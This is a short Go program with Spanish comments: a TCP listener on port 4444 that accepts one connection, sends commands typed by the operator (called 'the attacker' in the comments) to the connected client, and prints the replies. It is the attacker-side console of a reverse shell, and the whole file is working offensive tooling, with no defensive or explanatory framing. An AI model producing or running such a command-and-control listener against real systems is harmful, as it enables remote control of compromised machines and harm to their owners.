package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func main() {
	// Dirección IP y puerto donde el servidor escucha
	serverAddress := "0.0.0.0:4444" // Asegúrate de que esté disponible

	// Escuchar en el puerto 4444
	listener, err := net.Listen("tcp", serverAddress)
	if err != nil {
		fmt.Println("Error al iniciar el servidor:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Esperando conexión...")

	// Aceptar la conexión entrante
	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("Error al aceptar la conexión:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Conexión establecida con", conn.RemoteAddr())

	// Crear un lector para leer los comandos del atacante
	reader := bufio.NewReader(os.Stdin)

	for {
		// Solicitar comando al atacante
		fmt.Print("Comando > ")

		// Leer el comando desde la entrada estándar (teclado del atacante)
		cmd, _ := reader.ReadString('\n')

		// Enviar el comando al cliente
		_, err := conn.Write([]byte(cmd))
		if err != nil {
			fmt.Println("Error al enviar el comando:", err)
			return
		}

		// Leer y mostrar la respuesta del cliente
		response := make([]byte, 4096)
		n, err := conn.Read(response)
		if err != nil {
			fmt.Println("Error al recibir la respuesta:", err)
			return
		}

		// Mostrar la respuesta en la terminal del atacante
		fmt.Println("Respuesta:\n", string(response[:n]))
	}
}
